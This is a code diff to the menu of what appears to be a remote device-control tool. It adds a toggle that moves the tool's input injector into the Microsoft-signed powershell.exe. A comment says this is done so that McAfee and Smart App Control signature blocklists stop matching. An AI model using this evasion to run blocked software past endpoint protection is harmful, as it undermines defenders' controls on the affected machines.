@@ -895,6 +895,34 @@ function showDeviceMenu(d, x, y) {
         }}),
       });
     }
+    // Input backend toggle. On a device where McAfee WPS / Smart App Control
+    // kills the standalone injector.exe (the "Control blocked" badge keeps
+    // reappearing), flipping to the PowerShell backend hosts the same input
+    // logic inside the Microsoft-signed powershell.exe so signature-based
+    // blocklists stop matching. Reads the current state from meta.injectorBackend
+    // and flips to the other side; a ✓ marks whichever is active. The op is
+    // defined in agent/main.js as 'inject-backend'.
+    {
+      const curr = (d.meta && d.meta.injectorBackend) || 'exe';
+      const next = curr === 'powershell' ? 'exe' : 'powershell';
+      const label = curr === 'powershell'
+        ? 'Input backend: PowerShell ✓ — switch to exe'
+        : 'Input backend: exe ✓ — try PowerShell (for McAfee)';
+      items.push({
+        label,
+        act: () => deviceOp(d.id, 'inject-backend', { backend: next }, { onResult: (m) => {
+          if (!m.ok) { toast(m.error || 'failed', 'err'); return; }
+          // Patch our local cache so the next right-click shows the ✓ against
+          // the backend we just switched to. Full devicesCache refresh follows
+          // when the relay re-broadcasts; this just avoids a stale menu.
+          const applied = (m.data && m.data.backend) || next;
+          if (d.meta) d.meta.injectorBackend = applied;
+          const cached = devicesCache.find((x) => x.id === d.id);
+          if (cached) { cached.meta = cached.meta || {}; cached.meta.injectorBackend = applied; }
+          toast('Input backend set to ' + applied + ' — reconnecting injector', 'ok');
+        }}),
+      });
+    }
     items.push({ label: 'Sign out user', act: () => powerAction(d, 'logoff') });
     items.push({ label: 'Sleep', act: () => powerAction(d, 'sleep') });
     items.push({ label: 'Restart', act: () => powerAction(d, 'restart') });
